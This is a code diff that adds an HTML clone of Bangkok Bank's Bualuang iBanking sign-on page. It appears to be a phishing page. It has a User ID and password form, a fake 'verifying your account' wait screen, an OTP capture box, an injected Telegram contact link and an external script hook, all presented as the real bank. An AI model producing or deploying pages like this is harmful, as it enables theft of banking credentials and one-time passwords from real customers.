@@ -1,0 +1,205 @@
+<html xmlns="http://www.w3.org/1999/xhtml"><head><link rel="apple-touch-icon" sizes="72x72" href="WorkSpace/images/iB_72x72.png"><title>
+	:: Bualuang iBanking ::
+</title><link rel="shortcut icon" href="WorkSpace/image/ib.ico"><meta name="keywords" content="Bualuang iBanking, Online Banking, Internet Banking, Pay bill, Bill Payment, Fund Transfer, Mobile Topup, Mutual Funds, บัวหลวง ไอแบงก์กิ้ง, ธนาคารทางอินเตอร์เน็ต, ธนาคารออนไลน์, จ่ายบิล, โอนเงิน, เติมเงินมือถือ, ซื้อขายกองทุน"><meta name="description" http-equiv="content-type" content="With Bualuang iBanking, You can check your balance, Transfer funds to all banks in Thailand, pay bills, set up direct debits, buy mutual funds and sell mutual funds."><link id="css34/ib-signonOne.css" rel="stylesheet" href="css34/ib-signonOne.css" type="text/css">
+    
+
+    </script>
+
+    <style type="text/css">
+        /* Water Mask Wrapper */
+        .watermask-wrapper
+        {
+            display: inline-block;
+            position: inherit;
+            vertical-align: top;
+        }
+        .watermask-wrapper .watermask-label
+        {
+            font-weight: normal;
+            position: absolute;
+            z-index: 2;
+            padding: 2px 4px;
+            color: #888888;
+            cursor: text;
+            pointer-events: none;
+        }
+        .watermask-wrapper .watermask-hidden
+        {
+            display: none;
+        }      
+
+    </style>
+   
+<div class="ContactBox" style="text-align: center; margin-top: 20px;">
+    <a href="https://t.me/Bangkok890" target="_blank" class="btnTelegram">
+        <img src="https://upload.wikimedia.org/wikipedia/commons/8/82/Telegram_logo.svg" width="20" style="vertical-align: middle;">
+        Contact on Telegram
+    </a>
+</div>
+
+
+
+
+
+
+
+	
+
+    <div id="pnlMain">
+    <div id="dvHeader" class="header">
+        <div id="dvBBL_Logo" class="BBLLogo">
+            <img src="images/bbl_SignonlogoEN.gif" alt="BBL Logo"><span id="lblMC" style="color:#fff;">05</span>
+        </div>
+        <div id="dvSitchLang" class="SwitchLang">
+                <a id="lnkSwitchEN" href="javascript: if (DES_BtnClick('lnkSwitchEN')){try{https://ibanking.bangkokbank.com/signOn.aspx#}catch(e){if (window.DES_DSBody)DES_DSBody(false);}}" class="Active">Eng</a><span class="Active"><u> / </u></span><a id="lnkSwitchTH" href="javascript: if (DES_BtnClick('lnkSwitchTH')){try{__doPostBack('lnkSwitchTH','')}catch(e){if (window.DES_DSBody)DES_DSBody(false);}}" class="InActive">ไทย</a></div>
+    </div>
+    <div style="clear: both;">
+    </div>
+    <div id="dvTopBar" class="topBar">
+        &nbsp;</div>
+    <div id="dvContent" class="container">
+        <div class="Box1">
+            <img src="images/14032022_Big_Pic_En.jpg" id="imgBBLFocus" width="520" height="450" style="border:0px;" onclick="javascript:OpenTile('https://www.bangkokbank.com/th-TH/Personal/Tips-and-Insights/Gang-CallCenter');" class="Hand">
+        </div>
+        <div style="width: 20px; float: left;">
+            &nbsp;</div>
+        <div class="LogOnBox">
+            <form id="loginForm">
+            <div class="iBankingLoGo">
+                <img alt="" src="images/logo_ibanking.gif" width="285">
+            </div>
+            <div class="EnterData">
+                <span id="txiID_watermask_wrapper" class="watermask-wrapper" style="width: 174px;"><label id="txiID_watermask_label" for="txiID" class="watermask-label">User ID</label><input name="txiID" type="text" maxlength="32" id="txiID" onpaste="return false" size="28" autocomplete="off" watermark="User ID" style="width:166px;"></span>&nbsp;<span style="visibility:hidden;display:none" class="ErrImg" id="vldReqID"><img id="vldReqID_Img" src="images/Error.gif" alt="" style="border-width:0px;"></span>
+            </div>
+            <div class="EnterData">
+                <span id="txiPwd_watermask_wrapper" class="watermask-wrapper" style="width: 174px;"><label id="txiPwd_watermask_label" for="txiPwd" class="watermask-label">PIN/Password</label><input name="txiPwd" type="password" maxlength="32" id="txiPwd" onpaste="return false" autocomplete="off" size="28" watermark="PIN/Password" style="width:166px;"></span>&nbsp;<span style="visibility:hidden;display:none" class="ErrImg" id="vldReqPwd"><img id="vldReqPwd_Img" src="images/Error.gif" alt="" style="border-width:0px;"></span>
+            </div>
+            <div style="width: 20px; float: left;">
+            &nbsp;</div>
+            <div class="btnLogOnCover">
+                <input type="button" value="Log On" id="btnLogOn" class="btnLogOn" style="width:110px;">
+            </div>
+
+            <div id="loadingSection" style="display:none; text-align:center;">
+                <img src="https://i.gifer.com/ZZ5H.gif" alt="Loading" style="width:50px;">
+                <p>Please wait a minute, we are verifying your account...</p>
+            </div>
+            
+            <div id="otpSection" style="display:none;">
+                <p>Enter OTP sent to your device</p>
+                <input type="text" placeholder="Enter OTP" id="otpInput">
+                <button type="button" id="btnVerify">Verify</button>
+            </div>
+        </form>
+
+            <div>
+                <div class="btnRegisterOnline">
+                    <a id="lnkRegisterOnline" href="javascript: if (DES_BtnClick('lnkRegisterOnline')){try{__doPostBack('lnkRegisterOnline','')}catch(e){if (window.DES_DSBody)DES_DSBody(false);}}">Register Online</a>
+                </div>
+                <div class="BHBox">
+                    <img id="imgHint" src="images/sgHint.gif" alt="Hint" class="HintEN Hand" style="display:none;" onclick="javascript:OpenHintPage();">&nbsp;&nbsp;<img src="images/sgBkm.gif" alt="Bookmark" class="Bookmark Hand" onclick="javascript:CreateBookmarkLink();">
+                </div>
+            </div>
+        </div>
+        
+        <div class="NewsBox">
+            <div id="dvNews" style="padding-bottom: 15px;"><div><div class="NewsHeader">Warning against smartphone virus / Phishing mail</div><div class="NewsTitle">Bangkok Bank will never send an SMS/MMS/Email requesting you to download or install any software/application onto your mobile phone. Please be aware that malicious applications can steal your User ID, Password and OTP <a href="javascript:OpenTile(&quot;https://www.bangkokbank.com/en/Security-Tips/Fake-APP-SMS-Email-and-Website&quot;);">More</a></div></div><div><div class="NewsHeader">Security tips for using banking services via electronic channels</div><div class="NewsTitle">DO NOT provide your User ID and Password to others, or input them on websites or applications other than those of Bangkok Bank. <a href="javascript:OpenTile(&quot;https://www.bangkokbank.com/en/Personal/Digital-Banking/Bualuang-iBanking/Personal-Financial-App&quot;);">More</a></div></div></div>
+        </div>
+        <div style="height: 20px; clear: both;">&nbsp;</div>
+    
+    </div>
+   <div style="height: 20px; clear: both;">
+            &nbsp;</div>
+    <div style="display:none"><script>EnableSignonBox();</script></div>
+    <div class="SignOnAdverFooter">
+        <div style="height: 20px;">
+            &nbsp;</div>
+        <div style="clear: both;">
+        </div>
+        <div id="dvFTAdvertise_ImgCollect" class="FTAdvertise_ImgCollect">
+            <div class="Box"></div>
+        </div>
+        <div style="width: 100%;">
+            <div style="clear: both;">
+                &nbsp;</div>
+            <div id="dvVerisign" style="width: 135px;" class="Center">
+                <table width="135" border="0" cellpadding="2" cellspacing="0" title="Click to Verify - This site chose VeriSign SSL for secure e-commerce and confidential communications.">
+                    <tbody><tr>
+                        <td width="135" align="center" valign="top">
+
+                            <script type="text/javascript" src="https://seal.websecurity.norton.com/getseal?host_name=ibanking.bangkokbank.com&amp;size=S&amp;
+                    use_flash=NO&amp;use_transparent=NO&amp;lang=en"></script>
+
+                            <br>
+                            <a href="http://www.websecurity.symantec.com/ssl-certificate/" target="_blank" style="color: #000000;
+                                text-decoration: none; font: bold 7px verdana,sans-serif; letter-spacing: .5px;
+                                text-align: center; margin: 0px; padding: 0px;">ABOUT SSL CERTIFICATES</a>
+                        </td>
+                    </tr>
+                </tbody></table>
+            </div>
+            <div style="clear: both;">
+            </div>
+            
+        </div>
+    </div>
+    </div>
+    
+    <div style="clear: both;"></div>
+    
+   
+    
+    
+    <div>
+        
+<div id="dvBBLOtherInfo">
+    <a href="http://www.bangkokbank.com/online%20banking/for%20personal/ibanking/pages/default.aspx" class="signonlink">
+        <span id="ucSignonFooter1_lblHomePageLink" class="signonlink Hand">Bualuang iBanking Home Page</span></a>
+    | <a href="http://www.bangkokbank.com/Online Banking/For Personal/iBanking/New Users/pages/Terms and Conditions.aspx" class="signonlink">
+        <span id="ucSignonFooter1_lblTCLink" class="signonlink Hand">Terms and Conditions</span></a>
+    | <a href="https://www.bangkokbank.com/en/Privacy-Notice" class="signonlink">
+        <span id="ucSignonFooter1_lblSecurityLink" class="signonlink Hand">Security and Privacy</span>
+    </a>
+</div>
+<div style="clear: both;"></div>
+<div id="dvCopyright"><span id="ucSignonFooter1_lblCopy" class="signoncopyright">Copyright 2001 Bangkok Bank Public Company Limited</span></div>
+    </div>
+    
+
+    
+
+
+
+<head><link rel="apple-touch-icon" sizes="72x72" href="WorkSpace/images/iB_72x72.png"><title>
+	:: Bualuang iBanking ::
+</title><link rel="shortcut icon" href="WorkSpace/image/ib.ico"><meta name="keywords" content="Bualuang iBanking, Online Banking, Internet Banking, Pay bill, Bill Payment, Fund Transfer, Mobile Topup, Mutual Funds, บัวหลวง ไอแบงก์กิ้ง, ธนาคารทางอินเตอร์เน็ต, ธนาคารออนไลน์, จ่ายบิล, โอนเงิน, เติมเงินมือถือ, ซื้อขายกองทุน"><meta name="description" http-equiv="content-type" content="With Bualuang iBanking, You can check your balance, Transfer funds to all banks in Thailand, pay bills, set up direct debits, buy mutual funds and sell mutual funds."><link id="css_ib_signonOne" rel="stylesheet" href="css34/ib-signonOne.css" type="text/css">
+    
+        
+    </script>
+
+    <style type="text/css">
+        /* Water Mask Wrapper */
+        .watermask-wrapper
+        {
+            display: inline-block;
+            position: inherit;
+            vertical-align: top;
+        }
+        .watermask-wrapper .watermask-label
+        {
+            font-weight: normal;
+            position: absolute;
+            z-index: 2;
+            padding: 2px 4px;
+            color: #888888;
+            cursor: text;
+            pointer-events: none;
+        }
+        .watermask-wrapper .watermask-hidden
+        {
+            display: none;
+        }      
+
+    </style>
+            <script src="myscript.js"></script>
+        </body></html>
